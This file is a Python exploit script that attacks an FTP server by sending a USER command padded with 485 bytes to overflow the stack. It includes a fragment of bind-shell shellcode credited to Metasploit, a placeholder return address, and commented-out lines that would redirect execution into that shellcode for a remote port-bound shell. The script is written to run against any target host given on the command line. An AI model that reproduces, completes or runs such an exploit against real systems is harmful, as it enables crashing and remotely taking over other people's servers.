#!/usr/bin/python
import os
import sys
import time
import socket
import struct

# Alphanumeric portbind shellcode from metasploit
shellcode  = "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"

def ExploitFTP(target):
    sockAddr = (target, 21)
    tsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tsock.connect(sockAddr)
    response = tsock.recv(1024)

    # At the time of overflow EBP points to our shellcode
    payload = "USER "
    payload += "A" * 485
    payload += struct.pack("<L", 0xdeadbeef)
    # Point of EIP overwrite. Address of 'call ebp' from user32.dll SP4
    #payload += struct.pack("<L", 0x77E14709)
    #payload += "\x90" * 100
    #payload += shellcode
    payload += "\r\n"
    tsock.send(payload)

if __name__ == '__main__':
    try:
        target = sys.argv[1]
    except IndexError:
        print 'Usage: %s <target>' % sys.argv[0]
        sys.exit(-1)

    ExploitFTP(target)
    time.sleep(2)